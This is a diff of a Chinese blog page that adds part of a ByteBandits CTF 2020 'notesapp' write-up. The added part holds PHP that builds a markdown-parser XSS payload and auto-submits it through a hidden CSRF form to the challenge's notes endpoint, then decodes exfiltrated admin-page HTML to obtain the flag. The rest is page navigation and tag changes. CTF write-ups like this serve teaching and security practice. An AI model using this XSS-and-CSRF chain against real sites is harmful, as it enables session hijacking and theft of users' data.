+$content="&lt;http://g&lt;!s://q?&lt;!-&lt;[&lt;script&gt;{$js}/\*](http://g)-&gt;a&gt;&lt;http://g&lt;!s://g.c?&lt;!-&lt;[a\\*/&lt;/script&gt;alert(1);/*](http://g)-&gt;a&gt;";
+$url='https://notes.web.byteband.it/update_notes';
+echo "&lt;form style='display:none;' id='form1' name='form1' method='post' action='{$url}'&gt;
+&lt;input name='notes' type='text' value='{$content}' /&gt;
+&lt;/form&gt;
+&lt;script type='text/javascript'&gt;function load_submit(){document.form1.submit()}load_submit();&lt;/script&gt;";
+$a=1;
+ob_flush();
+flush();
+?&gt;
+
+&lt;?php
+sleep(60);
+?&gt;
+
+</code></pre><p><code>vps</code>接收数据，</p>
+<p>然后只要把空格转换成<code>+</code> 号就可以了</p>
+<p>base64解码</p>
+<pre><code>echo 'CgkJCjxkaXYgY2xhc3M9Imhlcm8gaXMtZnVsbGhlaWdodCBpcy1jZW50ZXJlZCBpcy12Y2VudGVyZWQgaXMtcHJpbWFyeSI+Cgk8ZGl2IGNsYXNzPSJoZXJvLWhlYWQiPgoJCTxuYXYgY2xhc3M9Im5hdmJhciI+CgkJCTxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CgkJCQk8ZGl2IGNsYXNzPSJuYXZiYXItYnJhbmQiPgoJCQkJCTxhIGhyZWY9Ii8iIGNsYXNzPSJuYXZiYXItaXRlbSI+CgkJCQkJCU15Tm90ZXMKCQkJCQk8L2E+CgkJCQk8L2Rpdj4KCQkJCTxkaXYgY2xhc3M9Im5hdmJhci1tZW51Ij4KCQkJCQk8ZGl2IGNsYXNzPSJuYXZiYXItZW5kIj4KCQkJCQkJPHNwYW4gY2xhc3M9Im5hdmJhci1pdGVtIj4KCQkJCQkJCTxhIGhyZWY9Ii9sb2dvdXQiIGNsYXNzPSJidXR0b24gaXMtcHJpbWFyeSBpcy1pbnZlcnRlZCI+CgkJCQkJCQkJPHNwYW4+TG9nb3V0PC9zcGFuPgoJCQkJCQkJPC9hPgoJCQkJCQk8L3NwYW4+CgkJCQkJPC9kaXY+CgkJCQk8L2Rpdj4KCQkJPC9kaXY+CgkJPC9uYXY+Cgk8L2Rpdj4KCTxkaXYgY2xhc3M9Imhlcm8tYm9keSBjb2x1bW5zIGlzLWNlbnRlcmVkIGhhcy10ZXh0LWNlbnRlcmVkIj4KCQk8ZGl2IGNsYXNzPSJjb2x1bW4gaXMtNCI+CgkJCTxkaXYgY2xhc3M9InRpdGxlIj4KCQkJCUhvd2R5IGFkbWluIQoJCQk8L2Rpdj4KCQkJPCEtLSBzbyB0aGF0IHVzZXIgY2FuIHdyaXRlIGh0bWwgLS0+CgkJCTxwPglmbGFne2NoNDFuX3RIeV8zWHBsb2l0c190MF93MW59IDwvcD4KCQkJPGJyPgoJCQk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iL3VwZGF0ZV9ub3RlcyI+CgkJCQk8dGV4dGFyZWEgY2xhc3M9InRleHRhcmVhIiBuYW1lPSJub3RlcyIgcGxhY2Vob2xkZXI9IldyaXRlIHNvbWV0aGluZyBoZXJlIj48L3RleHRhcmVhPgoJCQkJPGlucHV0IGNsYXNzPSJidXR0b24gaXMtZnVsbHdpZHRoIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJVcGRhdGUiIG5hbWU9IiI+CgkJCTwvZm9ybT4KCQk8L2Rpdj4KCTwvZGl2Pgo8L2Rpdj4KCgo8Zm9vdGVyIGNsYXNzPSJmb290ZXIiPgogIDxkaXYgY2xhc3M9ImNvbnRlbnQgaGFzLXRleHQtY2VudGVyZWQiPgogICAgPHA+CiAgICAgIDxzdHJvbmc+TXlOb3Rlczwvc3Ryb25nPiBieSBuMG9iLgogICAgPC9wPgogIDwvZGl2Pgo8L2Zvb3Rlcj4KCg=='|base64 -d
+</code></pre><p>看到<code>&lt;p&gt;    flag{ch41n_tHy_3Xploits_t0_w1n} &lt;/p&gt;</code></p>
+<p><strong>flag:</strong></p>
+<p>flag{ch41n_tHy_3Xploits_t0_w1n}</p>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -675,7 +773,7 @@ else 0 end;</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/2020/02/14/sqlite/">http://yoursite.com/2020/02/14/sqlite/</a>
+                    <a href="http://yoursite.com/2020/04/12/byte-bandits-ctf-2020-bu-fen-writeup-notesapp/">http://yoursite.com/2020/04/12/byte-bandits-ctf-2020-bu-fen-writeup-notesapp/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -717,8 +815,8 @@ else 0 end;</code></pre>
                                     <span class="chip bg-color">web</span>
                                 </a>
                             
-                                <a href="/tags/sql/">
-                                    <span class="chip bg-color">sql</span>
+                                <a href="/tags/xss/">
+                                    <span class="chip bg-color">xss</span>
                                 </a>
                             
                         </div>
@@ -759,29 +857,84 @@ else 0 end;</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/02/24/gyctf2020-writeup/">
+                <a href="/2020/04/12/byte-bandits-ctf-2020-bu-fen-writeup-notesapp/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="2020新春战役GYCTF writeup">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="ByteBandits CTF 2020部分writeup-notesapp">
                         
-                        <span class="card-title">2020新春战役GYCTF writeup</span>
+                        <span class="card-title">ByteBandits CTF 2020部分writeup-notesapp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            2020新春战役，武汉加油
+                            Byte-Bandits-CTF2020 部分writeup-notesapp
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-02-24
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-12
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web/" class="post-category">
+                                    web
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/xss/">
+                        <span class="chip bg-color">xss</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/04/09/bei-wang/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/29.jpg" class="responsive-img" alt="备忘录">
+                        
+                        <span class="card-title">备忘录</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            备忘录
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-09
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -801,47 +954,6 @@ else 0 end;</code></pre>
                         <span class="chip bg-color">web</span>
                     </a>
                     
-                    <a href="/tags/writeup/">
-                        <span class="chip bg-color">writeup</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/02/10/hello-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-10
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            m0on
-                            
-                        </span>
-                    </div>
                 </div>
                 
             </div>
